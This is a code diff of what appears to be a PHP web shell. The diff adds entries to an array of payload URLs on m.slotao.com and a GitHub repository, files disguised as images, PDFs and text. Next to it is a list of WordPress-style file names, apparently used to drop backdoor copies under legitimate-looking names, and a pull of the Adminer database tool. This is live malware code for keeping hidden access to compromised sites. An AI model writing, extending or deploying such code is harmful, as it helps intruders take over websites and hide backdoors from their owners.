@@ -53,8 +53,6 @@ if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
         printLogin();		
 ?>
 <?php
-date_default_timezone_set("Asia/Jakarta");
-clearstatcache();
 function usergroup()
 {
 	if (!function_exists('posix_getegid')) {
@@ -2129,7 +2127,7 @@ Link Config: <br>
 
 				
 
-				$itemsxz = array("https://m.slotao.com/licenses.png", "https://m.slotao.com/mari.png", "https://m.slotao.com/supre.png", "https://raw.githubusercontent.com/dono-zz/1945/main/mari.png", "https://m.slotao.com/class-wp-customize-nav-menu-customize.png", "https://m.slotao.com/Note.png", "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-mysql-en.php", "https://m.slotao.com/maridono.pdf");
+				$itemsxz = array("https://m.slotao.com/licenses.png", "https://m.slotao.com/mari.png", "https://m.slotao.com/marryme.psd", "https://m.slotao.com/supre.png", "https://raw.githubusercontent.com/dono-zz/1945/main/mari.png", "https://m.slotao.com/class-wp-customize-nav-menu-customize.png", "https://m.slotao.com/Note.png", "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-mysql-en.php", "https://m.slotao.com/maridono.pdf", "https://m.slotao.com/harapan.gif", "https://m.slotao.com/opsi.txt");
 				
 				$items = array("login.php", "xmlrpc.php", "edit-form-advanced.php", "link-parse-opml.php", "ms-sites.php", "options-writing.php", "themes.php", "https.php", "class-https.php", "admin-ajax.php", "edit-form-comment.php", "link.php", "ms-themes.php", "mari.php", "plugin-editor.php", "admin-footer.php", "edit-link-form.php", "load-scripts.php", "ms-upgrade-network.php", "admin-functions.php", "edit.php", "load-styles.php", "ms-users.php", "plugins.php", "admin-header.php", "licenses.php", "edit-tag-form.php", "media-new.php", "my-sites.php", "apps.php", "post-new.php", "upgrade-themes.php", "sandwich.php", "edit-tags.php", "media.php", "nav-menus.php", "post.php", "admin-post.php", "maridono.php", "export.php", "Note.php", "media-upload.php", "network.php", "press-this.php", "upload.php", "async-upload.php", "menu-header.php", "options-discussion.php", "privacy.php", "user-edit.php", "menu.php", "options-general.php", "profile.php", "user-new.php", "moderation.php", "options-head.php", "revision.php", "users.php", "custom-background.php", "ms-admin.php", "options-media.php", "setup-config.php", "widgets.php", "theme-single.php", "custom-header.php", "ms-delete-site.php", "options-permalink.php", "term.php", "customize.php", "link-add.php", "supre.php", "ms-edit.php", "options.php", "edit-comments.php", "link-manager.php", "ms-options.php", "options-reading.php");
 
